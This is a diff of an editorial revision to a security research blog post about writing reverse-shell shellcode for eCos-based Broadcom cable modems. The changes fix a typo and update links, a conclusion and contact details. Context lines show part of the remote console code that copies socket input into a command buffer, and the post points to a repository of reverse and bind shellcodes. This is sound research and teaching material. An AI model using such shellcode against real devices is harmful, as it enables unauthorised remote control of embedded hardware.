@@ -131,7 +131,7 @@ while (1) {
     receivedBytes = recv_ptr(socket, buffer, 0x100, 0x0);
     // if we received something
     if (receivedBytes > 0) {
-        // copy received content into the consoel command buffer
+        // copy received content into the console command buffer
         char *commandBuffer = ((char *)consoleInstance);
         commandBuffer += COMMAND_OFFSET;
         strcpy_ptr(commandBuffer, buffer);
@@ -144,7 +144,7 @@ while (1) {
 return 0;
 {% endhighlight %}
 
-The commands are received and executed by a dedicated Thread (BcmEcRemoteTerminalConsoleThread -> BcmEcTerminalConsoleThread -> BcmTerminalConsoleThread).
+Note: If you like reversing, the commands are received and executed by a dedicated Thread (BcmEcRemoteTerminalConsoleThread -> BcmEcTerminalConsoleThread -> BcmTerminalConsoleThread).
 
 
 #### Command Offset 
@@ -345,7 +345,7 @@ simply rely on GCC `-T` option that allows us to provide our own linker script.
 -T script Use script as the linker script.  This option is supported by most systems using the GNU linker.  On some targets, such as bare-board targets without an operating system, the -T option may be required when linking to avoid references to undefined symbols.
 {% endhighlight %}
 
-If you want to follow along, all the content below has been made public on our [Github](https://github.com/ecos-wtf/recos).
+If you want to follow along, all the content below has been made public on our [Github](https://github.com/ecos-wtf/ecoshell).
 
 #### Makefile
 
@@ -511,6 +511,8 @@ int __start(unsigned long ip_address, unsigned short port)
 }
 {% endhighlight %}
 
+The code is way cleaner than the initial method, right ?
+
 #### Calling
 
 The shellcode has been designed to accept parameters from the command line when called using
@@ -525,8 +527,8 @@ Calling function 0x80810000(0x00000000, 0x115c)
 
 ### Conclusion
 
-You now have all the tools to write your own reverse shell shellcode and deliver it to your [ROP chain handler](#TODO).
+You now have all the tools to write your own reverse shell shellcode and deliver it to your [ROP chain handler]({{site.url}}/2021/03/13/ecos-stack-buffer-overflow-exploit). But you can do much more as long as you understand the eCos architecture ! 
 
-A repository with a bunch of shellcodes (reverse shell, bind shell, reverse shell in a thread, bind shell in a thread, sample threading app) is now available on [Github](https://github.com/ecos-wtf/ecoshell).
+I created a repository with a bunch of shellcodes (reverse shell, bind shell, reverse shell in a thread, bind shell in a thread, sample threading app) and build instruction on [Github](https://github.com/ecos-wtf/ecoshell). The repository contains a piece of Python code to write shellcode in memory over serial so that you can call and debug your code from the CLI.
 
-As always, if you have any question feel free to contact me via [Twitter](https://twitter.com) or [email](mailto:quentin@ecos.wtf).
+As always, if you have any question feel free to contact me via [Twitter](https://twitter.com/qkaiser) or [email](mailto:quentin@ecos.wtf).
